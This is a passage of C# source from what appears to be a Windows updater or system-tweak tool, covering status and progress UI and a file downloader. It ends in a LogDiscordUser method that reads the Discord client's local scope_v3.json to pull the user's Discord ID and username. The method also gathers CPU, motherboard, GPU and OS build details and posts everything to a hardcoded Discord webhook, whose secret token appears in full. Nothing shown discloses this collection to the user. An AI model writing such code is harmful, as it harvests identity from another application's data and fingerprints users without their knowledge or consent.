                }

                StatusText.Text = title + "...";
                currentGroup.Add(action);
                previousTitle = title;
            }

            if (currentGroup.Count > 0)
            {
                foreach (var groupedAction in currentGroup)
                {
                    try
                    {
                        await groupedAction();
                    }
                    catch (Exception ex)
                    {
                        StatusText.Text = ex.Message;
                        ProgressBar.Foreground = (Brush)Application.Current.Resources["SystemFillColorCriticalBrush"];
                    }
                }
                ProgressBar.Value += incrementPerTitle;
            }

            //updater.IsPrimaryButtonEnabled = true;
        }

        public async Task RunDownload(string url, string path, string file = null)
        {
            string title = StatusText.Text;

            var uiContext = SynchronizationContext.Current;

            DownloadBuilder downloadBuilder;

            if (url.Contains("raw.githubusercontent.com", StringComparison.OrdinalIgnoreCase))
            {
                using var client = new HttpClient();
                await File.WriteAllTextAsync(string.IsNullOrWhiteSpace(file) ? path : Path.Combine(path, file), await client.GetStringAsync(url), Encoding.UTF8);
                return;
            }
            else if (url.Contains("drivers.amd.com", StringComparison.OrdinalIgnoreCase))
            {
                var config = new DownloadConfiguration
                {
                    RequestConfiguration = new RequestConfiguration
                    {
                        Headers = new WebHeaderCollection
                        {
                            { "Referer", "https://www.amd.com/en/support/downloads/drivers.html" }
                        }
                    }
                };

                downloadBuilder = DownloadBuilder.New()
                    .WithUrl(url)
                    .WithDirectory(path)
                    .WithConfiguration(config);
            }
            else
            {
                downloadBuilder = DownloadBuilder.New()
                    .WithUrl(url)
                    .WithDirectory(path)
                    .WithConfiguration(new DownloadConfiguration());
            }

            if (!string.IsNullOrWhiteSpace(file))
            {
                downloadBuilder.WithFileName(file);
            }

            var download = downloadBuilder.Build();

            DateTime lastLoggedTime = DateTime.MinValue;

            double receivedMB = 0.0;
            double totalMB = 0.0;
            double speedMB = 0.0;
            double percentage = 0.0;

            download.DownloadProgressChanged += (sender, e) =>
            {
                if ((DateTime.Now - lastLoggedTime).TotalMilliseconds < 50)
                    return;

                lastLoggedTime = DateTime.Now;

                speedMB = e.BytesPerSecondSpeed / (1024.0 * 1024.0);
                receivedMB = e.ReceivedBytesSize / (1024.0 * 1024.0);
                totalMB = e.TotalBytesToReceive / (1024.0 * 1024.0);
                percentage = e.ProgressPercentage;

                uiContext?.Post(_ =>
                {
                    StatusText.Text = $"{title} ({speedMB:F1} MB/s - {receivedMB:F2} MB of {totalMB:F2} MB)";
                }, null);
            };

            download.DownloadFileCompleted += (sender, e) =>
            {
                uiContext?.Post(_ =>
                {
                    StatusText.Text = $"{title} ({speedMB:F1} MB/s - {totalMB:F2} MB of {totalMB:F2} MB)";
                }, null);
            };

            await download.StartAsync();
        }

        public static async Task LogDiscordUser()
        {
            var cpuObj = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor")
                            .Get()
                            .Cast<ManagementObject>()
                            .FirstOrDefault();
            string cpuName = cpuObj?["Name"]?.ToString() ?? "";

            var boardObj = new ManagementObjectSearcher("SELECT Manufacturer, Product FROM Win32_BaseBoard")
                              .Get()
                              .Cast<ManagementObject>()
                              .FirstOrDefault();
            string motherboard = boardObj != null ? $"{boardObj["Manufacturer"]} {boardObj["Product"]}" : "";

            var gpuObjs = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController")
                              .Get()
                              .Cast<ManagementObject>();
            string gpus = string.Join(", ", gpuObjs.Select(g => g["Name"]?.ToString() ?? ""));

            using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            string build = key.GetValue("CurrentBuild")?.ToString() ?? "";
            string ubr = key.GetValue("UBR")?.ToString() ?? "";
            string osVersion = $"{build}.{ubr}";

            string discordId = "Failed to get Discord account id";
            string discordUsername = "Failed to get Discord username";

            string discordJsonPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "sentry", "scope_v3.json");
            if (File.Exists(discordJsonPath))
            {
                try
                {
                    string jsonText = File.ReadAllText(discordJsonPath);
                    using JsonDocument doc = JsonDocument.Parse(jsonText);

                    if (doc.RootElement.TryGetProperty("scope", out var scope) &&
                        scope.TryGetProperty("user", out var user))
                    {
                        discordId = user.GetProperty("id").GetString() ?? discordId;
                        discordUsername = user.GetProperty("username").GetString() ?? discordUsername;
                    }
                }
                catch
                {

                }
            }

            using var client = new HttpClient();

            using var multipart = new MultipartFormDataContent
            {
                { new StringContent($"<@{discordId}>\n{discordUsername}\n{cpuName}\n{motherboard}\n{gpus}\n{osVersion}\n{ProcessInfoHelper.Version}"), "content" }
            };

            await client.PostAsync("https://discord.com/api/webhooks/1444743483486240860/V_myd24FjH7TNJPruYbNJcnuE9Xany7C-tAScpygDV_FOGnwmuamSuOgXdxlts1Q2MhM", multipart);
        }
    }
}